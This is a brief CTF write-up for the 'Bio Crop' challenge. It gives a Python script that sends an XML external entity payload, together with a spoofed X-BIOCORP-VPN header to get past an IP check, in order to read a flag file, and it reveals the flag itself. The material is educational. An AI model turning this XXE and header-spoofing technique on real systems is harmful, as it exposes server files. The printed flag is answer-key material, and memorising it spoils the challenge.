# 1337Up Live CTF

## Bio Crop

> https://biocorp.ctf.intigriti.io

XML external entity injection.

## Approach

Also need to bypass the check of IP by adding a custom HTTP header.

```python
import requests

url = "https://biocorp.ctf.intigriti.io/panel.php"
xml = """
<!DOCTYPE root [
<!ENTITY fileContents SYSTEM "file:///../flag.txt">
]>
<root>
<temperature>&fileContents;</temperature>
<pressure>77</pressure>
<control_rods>77</control_rods>
</root>
"""
resp = requests.post(url, headers={"X-BIOCORP-VPN": "80.187.61.102", "Content-Type": "application/xml"}, data=xml)
print(resp.text)
```

## Flag

```
INTIGRITI{c4r3ful_w17h_7h053_c0n7r0l5_0r_7h3r3_w1ll_b3_4_m3l7d0wn}
```
